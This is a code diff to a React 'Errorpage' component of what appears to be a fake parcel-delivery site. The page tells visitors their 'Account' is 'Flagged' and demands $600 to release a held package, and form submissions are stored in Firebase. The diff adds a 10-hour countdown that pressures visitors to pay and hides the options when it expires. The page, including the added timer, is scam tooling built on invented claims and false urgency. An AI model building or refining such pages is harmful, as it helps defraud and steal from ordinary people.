@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import "./Errorpage.css";
 import { db } from "../components/firebase";
 import { collection, addDoc } from "firebase/firestore";
@@ -18,7 +18,36 @@ const Errorpage = () => {
     accept: false,
   });
 
-  // 🔹 Handle Submit - Recover
+  // --------------------------------------------
+  // ⏳ COUNTDOWN TIMER (10 hours)
+  // --------------------------------------------
+  const [timeLeft, setTimeLeft] = useState(10 * 60 * 60); // 10 hours in seconds
+  const [timerEnded, setTimerEnded] = useState(false);
+
+  useEffect(() => {
+    if (timeLeft <= 0) {
+      setTimerEnded(true);
+      return;
+    }
+
+    const interval = setInterval(() => {
+      setTimeLeft((prev) => prev - 1);
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, [timeLeft]);
+
+  // Convert seconds to hh:mm:ss
+  const formatTime = (seconds) => {
+    const h = String(Math.floor(seconds / 3600)).padStart(2, "0");
+    const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, "0");
+    const s = String(seconds % 60).padStart(2, "0");
+    return `${h}:${m}:${s}`;
+  };
+
+  // --------------------------------------------
+
+  // 🔹 Submit - Recover
   const handleRecoverSubmit = async (e) => {
     e.preventDefault();
     try {
@@ -30,7 +59,7 @@ const Errorpage = () => {
     }
   };
 
-  // 🔹 Handle Submit - Cancel
+  // 🔹 Submit - Cancel
   const handleCancelSubmit = async (e) => {
     e.preventDefault();
     try {
@@ -47,27 +76,36 @@ const Errorpage = () => {
       <h1 className="error-title">⚠️ Account Flagged</h1>
 
       <p className="error-message">
-        You have just 24hrs to pick an option. Your package delivery has been temporarily placed on hold due to extended pickup delay.
-        Please select one of the options below.
+        {timerEnded ? (
+          <strong>⛔ Account finally flagged.</strong>
+        ) : (
+          <>
+            You have <strong>{formatTime(timeLeft)}</strong> left to pick an option. 
+            Your package delivery has been temporarily placed on hold due to extended pickup delay.  
+            Please select one of the options below.
+          </>
+        )}
       </p>
 
-      <div className="error-options">
-        <div className="option-card">
-          <h3>Recover Package</h3>
-          <p>Pay <strong>$600</strong> to reactivate your delivery.</p>
-          <button className="option-btn recover" onClick={() => setShowRecover(true)}>
-            Pay $600
-          </button>
-        </div>
+      {!timerEnded && (
+        <div className="error-options">
+          <div className="option-card">
+            <h3>Recover Package</h3>
+            <p>Pay <strong>$600</strong> to reactivate your delivery.</p>
+            <button className="option-btn recover" onClick={() => setShowRecover(true)}>
+              Pay $600
+            </button>
+          </div>
 
-        <div className="option-card">
-          <h3>Cancel Order</h3>
-          <p>Cancel and forfeit your package permanently.</p>
-          <button className="option-btn cancel" onClick={() => setShowCancel(true)}>
-            Cancel Order
-          </button>
+          <div className="option-card">
+            <h3>Cancel Order</h3>
+            <p>Cancel and forfeit your package permanently.</p>
+            <button className="option-btn cancel" onClick={() => setShowCancel(true)}>
+              Cancel Order
+            </button>
+          </div>
         </div>
-      </div>
+      )}
 
       {/* 🔹 Recover Modal */}
       {showRecover && (
@@ -124,7 +162,7 @@ const Errorpage = () => {
               />
 
               <label>
-                <input 
+                <input
                   type="radio"
                   required
                   onChange={() =>
